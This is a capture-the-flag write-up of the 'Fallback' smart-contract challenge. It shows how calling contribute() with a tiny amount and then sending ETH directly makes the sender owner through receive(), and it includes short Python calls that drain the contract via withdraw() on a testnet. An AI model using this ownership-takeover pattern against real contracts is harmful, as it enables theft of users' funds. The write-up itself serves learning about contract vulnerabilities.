# Fallback

The fallback challenge has the following objectives:

1. you claim ownership of the contract

2. you reduce its balance to 0

## Solution

There's two ways to become owner in this contract:

* By contributing (using `contribute()`) a total amount larger than the contributions of the deployer, which are a total of 1000 ETH deposited in individual transactions of less than 0.001 ETH. It would take 1000001 to 1000002 transactions depositing 0.000999999 ETH every time.

* By performing the following steps:

1. Call the `contribute()` function with a value lower than 0.001 ETH.

2. Now that our contribution is larger 0, we can then send ETH to the contract with a value larger than 0 and we will become owner through the `receive()` function.

3. We have now become owner and can call the `withdraw()` function to drain the contract's funds.

## How I did it

1. Contribute 0.0009 ETH calling the `contribute()` function.

```python
fallback.contribute(_from | {'value':0.0009*1e18})
```

Tx hash: https://rinkeby.etherscan.io/tx/0x90f854f08883f751c631d7829ccc0ee0386cfc42ee561fb2e0f088680e369f6f

1. Send the contract 0.0009 ETH

```python
acc.transfer(fallback, 0.0009*1e18)
```

Tx hash: https://rinkeby.etherscan.io/tx/0x45d02df610de828edff7ee0b80bfee2fa4ac1057ff6bc78ef1c7a2c0875bd26f

2. Call the `withdraw()` function

```python
fallback.withdraw(_from)
```

Tx hash: https://rinkeby.etherscan.io/tx/0xbbe13aecf3cf7793f032a845bdff886eae1a77d7bc95081b90113cd73a07852a

### Submission transaction

Tx hash: https://rinkeby.etherscan.io/tx/0x27e316034f676e3c00c0de9159e12d7441cca833d9a7bf29b366ef835c7dbb86
